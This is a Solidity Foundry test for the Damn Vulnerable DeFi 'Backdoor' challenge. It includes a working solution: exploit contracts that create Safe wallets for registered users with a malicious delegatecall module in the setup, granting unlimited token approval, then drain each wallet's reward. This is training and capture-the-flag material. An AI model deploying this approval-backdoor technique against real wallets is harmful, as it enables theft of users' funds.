// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity ^0.8.30;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {IProxyCreationCallback} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        new BackdoorExploit(
            address(walletFactory),
            address(walletRegistry),
            address(singletonCopy),
            address(token),
            users[0],
            users[1],
            users[2],
            users[3],
            recovery
        ).attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract BackdoorExploit {
    address walletFactory;
    address walletRegistry;
    address[] users;
    address recovery;
    address singleton;
    address token;
    TokenApprover approver;

    constructor(
        address walletFactoryAddress,
        address walletRegistryAddress,
        address singletonAddress,
        address tokenAddress,
        address aliceAddress,
        address bobAddress,
        address charlieAddress,
        address davidAddress,
        address recoveryAddress
    ) {
        walletFactory = walletFactoryAddress;
        walletRegistry = walletRegistryAddress;
        singleton = singletonAddress;
        users = [aliceAddress, bobAddress, charlieAddress, davidAddress];
        recovery = recoveryAddress;
        singleton = singletonAddress;
        token = tokenAddress;
        approver = new TokenApprover();
    }

    function attack() public {
        address[] memory owners = new address[](1);
        bytes memory approveCall = abi.encodeWithSelector(
            TokenApprover.approve.selector,
            token,
            address(this)
        );
        for (uint256 index = 0; index < users.length; index++) {
            owners[0] = users[index];
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                1,
                address(approver),
                approveCall,
                address(0),
                address(0),
                0,
                address(0)
            );
            SafeProxy proxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
                singleton,
                initializer,
                0,
                IProxyCreationCallback(walletRegistry)
            );
            IERC20(token).transferFrom(address(proxy), recovery, 10e18);
        }
    }

    receive() external payable {}
}

contract TokenApprover {
    function approve(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

